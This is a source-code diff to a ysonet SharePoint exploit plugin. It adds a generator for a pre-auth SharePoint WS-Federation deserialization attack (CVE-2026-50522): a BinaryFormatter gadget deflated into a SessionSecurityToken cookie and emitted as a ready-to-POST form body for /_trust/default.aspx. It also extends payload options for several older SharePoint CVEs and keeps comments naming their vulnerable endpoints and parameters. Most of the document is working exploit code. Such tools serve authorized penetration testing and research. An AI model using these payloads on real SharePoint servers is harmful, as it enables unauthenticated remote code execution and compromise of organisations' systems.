@@ -2,10 +2,12 @@ using NDesk.Options;
 using System;
 using System.Collections;
 using System.Collections.Generic;
+using System.IdentityModel;
 using System.IO;
 using System.IO.Compression;
 using System.Reflection;
 using System.Text;
+using System.Xml;
 using ysonet.Generators;
 using ysonet.Helpers;
 
@@ -20,7 +22,9 @@ using ysonet.Helpers;
  *      CVE-2019-0604: https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
  *      CVE-2018-8421: https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/
  *      CVE-2025-49704: https://blog.viettelcybersecurity.com/sharepoint-toolshell/
- *      CVE-2024-38018: https://blog.viettelcybersecurity.com/sharepoint_properties_deser/ (https://x.com/chudyPB/status/1945420677109936582) 
+ *      CVE-2025-53770: patch bypass of CVE-2025-49704 (ToolShell)
+ *      CVE-2024-38018: https://blog.viettelcybersecurity.com/sharepoint_properties_deser/ (https://x.com/chudyPB/status/1945420677109936582)
+ *      CVE-2026-50522: https://www.zerodayinitiative.com/advisories/ZDI-26-412/ (pre-auth SharePoint WS-Federation trust endpoint; deflate-only SessionSecurityToken cookie, no DPAPI/MachineKey secret needed)
  **/
 
 namespace ysonet.Plugins
@@ -30,15 +34,27 @@ namespace ysonet.Plugins
         static string cve = "";
         static string gadget = "TypeConfuseDelegate";
         static string command = "";
+        static string target = "";
         static bool useurl = false;
+        static bool formBody = false; // CVE-2026-50522: emit the full form body vs just the wresult token
+        static bool minify = false;
+        static bool useSimpleType = true;
+        static bool rawcmd = false;
+        static bool noComment = false; // suppress the explanatory HTML comment; output only the payload/form body
         static int variant = 1; // Add variant support for CVE-2025-49704
 
         static OptionSet options = new OptionSet()
             {
-                {"cve=", "the CVE reference: CVE-2025-49704, CVE-2024-38018, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421", v => cve = v },
+                {"cve=", "the CVE reference: CVE-2026-50522, CVE-2025-53770, CVE-2025-49704, CVE-2024-38018, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421", v => cve = v },
                 {"useurl", "to use the XAML url rather than using the direct command in CVE-2019-0604 and CVE-2018-8421", v => useurl = v != null },
-                {"g|gadget=", "a gadget chain for CVE-2020-1147 (LosFormatter) or CVE-2024-38018 (BinaryFormatter). Default: TypeConfuseDelegate ", v => gadget = v },
+                {"g|gadget=", "a gadget chain for CVE-2020-1147 (LosFormatter) or CVE-2024-38018 / CVE-2026-50522 (BinaryFormatter). Default: TypeConfuseDelegate ", v => gadget = v },
                 {"c|command=", "the command to be executed e.g. \"cmd /c calc\" or the XAML url e.g. \"http://b8.ee/x\" to make the payload shorter with the `--useurl` argument", v => command = v },
+                {"target=", "for CVE-2026-50522: the absolute SharePoint base URL used as the wctx value. Required with --formbody; on the default token output it only fills the delivery comment's wctx example. It is NOT contacted.", v => target = v },
+                {"formbody", "CVE-2026-50522 only: emit the full URL-encoded wa/wctx/wresult form body ready to POST, instead of just the wresult token. Requires --target.", v => formBody = v != null },
+                {"minify", "Whether to minify the payloads where applicable (experimental). Applies to the BinaryFormatter/LosFormatter gadget CVEs. Default: false", v => minify = v != null },
+                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType = v != null },
+                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
+                {"no-comment", "Output only the serialized payload or form body, without the trailing explanatory HTML comment.", v => noComment = v != null },
                 {"var|variant=", "Variant number for CVE-2025-49704 only. Choices: 1 (default, uses DataSetOldBehaviourGenerator variant 2), 2 (uses DataSetOldBehaviourFromFileGenerator variant 2)", v => int.TryParse(v, out variant) },
             };
 
@@ -49,12 +65,12 @@ namespace ysonet.Plugins
 
         public string Description()
         {
-            return "Generates payloads for the following SharePoint CVEs: CVE-2025-49704, CVE-2024-38018, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421";
+            return "Generates payloads for the following SharePoint CVEs: CVE-2026-50522, CVE-2025-53770, CVE-2025-49704, CVE-2024-38018, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421";
         }
 
         public string Credit()
         {
-            return "CVE-2024-38018: Piotr Bazydło - explained by Khoa Dinh & implemented by Soroush Dalili, CVE-2025-49704: Khoa Dinh - implemented by Soroush Dalili, CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili";
+            return "CVE-2024-38018: Piotr Bazydło - explained by Khoa Dinh & implemented by Soroush Dalili, CVE-2025-49704: Khoa Dinh - implemented by Soroush Dalili, CVE-2025-53770: patch bypass of CVE-2025-49704 - implemented by Soroush Dalili, CVE-2026-50522: splitline of DEVCORE Research Team (ZDI-26-412) - implemented by Soroush Dalili, CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili";
         }
 
         public OptionSet Options()
@@ -112,11 +128,29 @@ namespace ysonet.Plugins
                     Required = new string[] { "command" },
                     Preset = new Dictionary<string, string> { { "cve", "CVE-2018-8421" } },
                 },
+                new PluginMode {
+                    Name = "CVE-2026-50522",
+                    Description = "Pre-auth SharePoint WS-Federation trust endpoint; deflate-only token, no DPAPI/MachineKey secret needed. Default output is the wresult token; enable formbody for the full POST body (needs target).",
+                    Options = new string[] { "command", "target", "gadget", "formbody" },
+                    Required = new string[] { "command" },
+                    Preset = new Dictionary<string, string> { { "cve", "CVE-2026-50522" } },
+                },
             };
         }
 
         public object Run(string[] args)
         {
+
+            // Reset the target static before parsing. Plugin options live in static
+            // fields, so an in-process prior run could otherwise leave a target set and
+            // hide a missing --target on a later CVE-2026-50522 call. Parsing below
+            // fills them back in from this run's args.
+            target = "";
+            formBody = false;
+            minify = false;
+            useSimpleType = true;
+            rawcmd = false;
+            noComment = false;
 
             List<string> extra;
             try
@@ -144,32 +178,32 @@ namespace ysonet.Plugins
             {
                 case "cve-2018-8421":
                     payload = CVE_2018_8421();
-                    payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
+                    if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                 "https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/" +
                                 "\r\n-->";
 
                     break;
                 case "cve-2019-0604":
                     payload = CVE_2019_0604();
-                    payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
+                    if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                 "https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability" +
                                 "\r\n-->";
                     break;
                 case "cve-2020-1147":
                     payload = CVE_2020_1147();
-                    payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
+                    if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                 "https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html" +
                                 "\r\n The payload needs to be sent (POST request) in the __SUGGESTIONSCACHE__ parameter to /_layouts/15/quicklinks.aspx?Mode=Suggestion or /_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion " +
                                 "\r\n-->";
                     break;
                 case "cve-2024-38018":
                     payload = CVE_2024_38018();
-                    payload += "\r\n\r\n<!--\r\n The payload can be sent to any page supporting webparts such as /_vti_bin/webpartpages.asmx" +
+                    if (!noComment) payload += "\r\n\r\n<!--\r\n The payload can be sent to any page supporting webparts such as /_vti_bin/webpartpages.asmx" +
                                 "\r\n-->";
                     break;
                 case "cve-2025-49704":
                     payload = CVE_2025_49704(false);
-                    payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
+                    if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                 "https://blog.viettelcybersecurity.com/sharepoint-toolshell/" +
                                 "\r\n The payload needs to be sent in the MSOTlPn_DWP parameter to /_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx" +
                                 "\r\n-->";
@@ -177,10 +211,17 @@ namespace ysonet.Plugins
                 case "cve-2025-53770":
                     // cve-2025-49704 patch bypass
                     payload = CVE_2025_49704(true);
-                    payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
+                    if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                 "https://blog.viettelcybersecurity.com/sharepoint-toolshell/" +
                                 "\r\n The payload needs to be sent in the MSOTlPn_DWP parameter to /_layouts/15/ToolPane.aspx/?DisplayMode=Edit&foo=/ToolPane.aspx" +
                                 "\r\n-->";
+                    break;
+                case "cve-2026-50522":
+                    // Default output is the wresult token XML plus a delivery comment
+                    // (like the other SharePoint modes). With --formbody the output is the
+                    // full URL-encoded wa/wctx/wresult body and no comment is appended (it
+                    // would corrupt the form body). Both are built inside the method.
+                    payload = CVE_2026_50522();
                     break;
             }
 
@@ -199,9 +240,9 @@ namespace ysonet.Plugins
         {
             InputArgs inputArgs = new InputArgs();
             inputArgs.Cmd = command;
-            inputArgs.IsRawCmd = true;
-            inputArgs.Minify = false;
-            inputArgs.UseSimpleType = false;
+            inputArgs.IsRawCmd = rawcmd;
+            inputArgs.Minify = minify;
+            inputArgs.UseSimpleType = useSimpleType;
 
             string formatter = "binaryformatter";
             byte[] binaryformatterPayload = new byte[] { };
@@ -310,13 +351,183 @@ namespace ysonet.Plugins
             return final_payload_template.Replace("{serializedPayload}", serializedPayload);
         }
 
+        // CVE-2026-50522: pre-auth SharePoint WS-Federation trust endpoint.
+        //
+        // Reproduces the public PoC path. A BinaryFormatter gadget is wrapped in a
+        // SharePoint WS-Federation sign-in token (wresult) and posted to the
+        // trusted-provider sign-in page. The cookie is deflate-only (no DPAPI or
+        // MachineKey protection), which is what makes this path reachable without a
+        // server secret. The SCT Cookie is Base64(Deflate(BinaryFormatter gadget)).
+        //
+        // Two output shapes:
+        //   default    - the wresult token XML plus a delivery comment (like the other
+        //                SharePoint modes). The operator posts wa/wctx/wresult; wctx is
+        //                transport, so it is not baked into the payload.
+        //   --formbody - the complete URL-encoded sign-in form body:
+        //                  wa=wsignin1.0&wctx=<base URL>&wresult=<RSTR/SCT XML>
+        //                ready to POST as application/x-www-form-urlencoded. Needs --target.
+        //
+        // POST to /_trust/default.aspx on an explicitly authorized SharePoint target.
+        // This method never contacts the URL.
+        public string CVE_2026_50522()
+        {
+            // A provided --target is always validated and normalized: it becomes wctx in
+            // the form body, or the wctx example in the default token's delivery comment.
+            // It is REQUIRED only with --formbody, and never contacted.
+            string normalizedTarget = null;
+            if (!String.IsNullOrEmpty(target) && !String.IsNullOrWhiteSpace(target))
+            {
+                Uri targetUri;
+                if (!Uri.TryCreate(target, UriKind.Absolute, out targetUri) ||
+                    (targetUri.Scheme != Uri.UriSchemeHttp && targetUri.Scheme != Uri.UriSchemeHttps))
+                {
+                    Console.WriteLine("--target must be an absolute http or https URL.");
+                    throw new Exception("--target must be an absolute http or https URL.");
+                }
+
+                if (!String.IsNullOrEmpty(targetUri.UserInfo) ||
+                    !String.IsNullOrEmpty(targetUri.Query) ||
+                    !String.IsNullOrEmpty(targetUri.Fragment))
+                {
+                    Console.WriteLine("--target must not contain user info, a query string, or a fragment.");
+                    throw new Exception("--target must not contain user info, a query string, or a fragment.");
+                }
+
+                // Normalize to a trailing slash so wctx is deterministic.
+                normalizedTarget = targetUri.GetLeftPart(UriPartial.Path);
+                if (!normalizedTarget.EndsWith("/"))
+                    normalizedTarget += "/";
+            }
+
+            if (formBody && normalizedTarget == null)
+            {
+                Console.WriteLine("--target is required with --formbody for CVE-2026-50522 (the SharePoint base URL used as wctx).");
+                throw new Exception("--target is required with --formbody for CVE-2026-50522.");
+            }
+
+            // Validate the gadget and require BinaryFormatter support.
+            if (!GadgetRegistry.GadgetExists(gadget))
+            {
+                Console.WriteLine("Gadget not supported.");
+                throw new Exception("Gadget not supported.");
+            }
+
+            IGenerator generator = GadgetRegistry.CreateGadgetInstance(gadget);
+            if (generator == null)
+            {
+                Console.WriteLine("Gadget not supported!");
+                throw new Exception("Gadget not supported!");
+            }
+
+            if (!generator.IsSupported("BinaryFormatter"))
+            {
+                Console.WriteLine("BinaryFormatter not supported by the selected gadget.");
+                throw new Exception("BinaryFormatter not supported by the selected gadget.");
+            }
+
+            InputArgs inputArgs = new InputArgs();
+            inputArgs.Cmd = command;
+            inputArgs.IsRawCmd = rawcmd;
+            inputArgs.Minify = minify;
+            inputArgs.UseSimpleType = useSimpleType;
+
+            byte[] binaryformatterPayload = generator.GenerateWithNoTest("BinaryFormatter", inputArgs) as byte[];
+            if (binaryformatterPayload == null || binaryformatterPayload.Length == 0)
+            {
+                Console.WriteLine("The selected gadget did not produce a BinaryFormatter payload.");
+                throw new Exception("The selected gadget did not produce a BinaryFormatter payload.");
+            }
+
+            // Deflate-only cookie: no DPAPI/MachineKey protection in this SharePoint path.
+            DeflateCookieTransform deflate = new DeflateCookieTransform();
+            byte[] deflated = deflate.Encode(binaryformatterPayload);
+            string cookieBase64 = Convert.ToBase64String(deflated);
+
+            string tokenIdentifier = "urn:unique-id:securitycontext:" + Guid.NewGuid().ToString("N");
+            string wresult = BuildTrustResponse(tokenIdentifier, cookieBase64);
+
+            if (formBody)
+            {
+                // Full request body: wa, wctx, wresult in a deterministic order, every
+                // value URL-encoded. Ready to POST as application/x-www-form-urlencoded.
+                StringBuilder body = new StringBuilder();
+                body.Append("wa=").Append(System.Web.HttpUtility.UrlEncode("wsignin1.0"));
+                body.Append("&wctx=").Append(System.Web.HttpUtility.UrlEncode(normalizedTarget));
+                body.Append("&wresult=").Append(System.Web.HttpUtility.UrlEncode(wresult));
+                return body.ToString();
+            }
+
+            // Default: the wresult token plus a delivery comment, matching the other
+            // SharePoint modes. wctx is transport only and stays out of the token; the
+            // comment shows how to post it (using --target if given, else a placeholder).
+            // --no-comment drops the comment and returns just the token.
+            if (noComment)
+                return wresult;
+
+            string wctxExample = normalizedTarget ?? "http://YOUR-SHAREPOINT-BASE/";
+            string guidance =
+                "\r\n\r\n<!--\r\n" +
+                "CVE-2026-50522: pre-auth SharePoint WS-Federation trust endpoint (ZDI-26-412).\r\n" +
+                "The value above is the wresult token (deflate-only SessionSecurityToken cookie,\r\n" +
+                "no DPAPI/MachineKey secret needed).\r\n" +
+                "POST it as application/x-www-form-urlencoded to /_trust/default.aspx on an\r\n" +
+                "explicitly authorized target, with these fields:\r\n" +
+                "  wa=wsignin1.0\r\n" +
+                "  wctx=" + wctxExample + "   (transport only; not part of the token)\r\n" +
+                "  wresult=<the token above>\r\n" +
+                "Tip: add --formbody --target <base URL> to emit the complete URL-encoded body instead.\r\n" +
+                "More: https://www.zerodayinitiative.com/advisories/ZDI-26-412/\r\n" +
+                "-->";
+            return wresult + guidance;
+        }
+
+        // Builds the WS-Federation RequestSecurityTokenResponse that carries the
+        // SecurityContextToken and the deflate-only cookie. Built with XmlWriter so the
+        // Base64 cookie and identifier are properly escaped, never string-interpolated.
+        private static string BuildTrustResponse(string tokenIdentifier, string cookieBase64)
+        {
+            const string nsTrust = "http://schemas.xmlsoap.org/ws/2005/02/trust";
+            const string nsSc = "http://schemas.xmlsoap.org/ws/2005/02/sc";
+            const string nsSecurity = "http://schemas.microsoft.com/ws/2006/05/security";
+
+            StringBuilder sb = new StringBuilder();
+            XmlWriterSettings settings = new XmlWriterSettings
+            {
+                OmitXmlDeclaration = true,
+                ConformanceLevel = ConformanceLevel.Fragment,
+                Indent = false,
+                Encoding = new UTF8Encoding(false),
+            };
+
+            using (XmlWriter xw = XmlWriter.Create(sb, settings))
+            {
+                xw.WriteStartElement("RequestSecurityTokenResponse", nsTrust);
+                xw.WriteStartElement("RequestedSecurityToken", nsTrust);
+                xw.WriteStartElement("SecurityContextToken", nsSc);
+
+                xw.WriteStartElement("Identifier", nsSc);
+                xw.WriteString(tokenIdentifier);
+                xw.WriteEndElement(); // Identifier
+
+                xw.WriteStartElement("Cookie", nsSecurity);
+                xw.WriteString(cookieBase64);
+                xw.WriteEndElement(); // Cookie
+
+                xw.WriteEndElement(); // SecurityContextToken
+                xw.WriteEndElement(); // RequestedSecurityToken
+                xw.WriteEndElement(); // RequestSecurityTokenResponse
+            }
+
+            return sb.ToString();
+        }
+
         public string CVE_2025_49704(bool useBypass)
         {
             InputArgs inputArgs = new InputArgs();
             inputArgs.Cmd = command;
-            inputArgs.IsRawCmd = true;
-            inputArgs.Minify = false; // minimisation of payload is not important here but we can do it if needed!
-            inputArgs.UseSimpleType = false; // minimisation of payload is not important here but we can do it if needed!
+            inputArgs.IsRawCmd = rawcmd;
+            inputArgs.Minify = minify;
+            inputArgs.UseSimpleType = useSimpleType;
 
             string final_payload_template = @"<%@ Register Tagprefix=""ScorecardClient"" Namespace=""Microsoft.PerformancePoint.Scorecards"" Assembly=""Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"" %>
 
@@ -399,9 +610,9 @@ runat=""server"">
         {
             InputArgs inputArgs = new InputArgs();
             inputArgs.Cmd = command;
-            inputArgs.IsRawCmd = true;
-            inputArgs.Minify = false; // minimisation of payload is not important here but we can do it if needed!
-            inputArgs.UseSimpleType = false; // minimisation of payload is not important here but we can do it if needed!
+            inputArgs.IsRawCmd = rawcmd;
+            inputArgs.Minify = minify;
+            inputArgs.UseSimpleType = useSimpleType;
 
             string formatter = "losformatter";
             string losFormatterPayload = "";
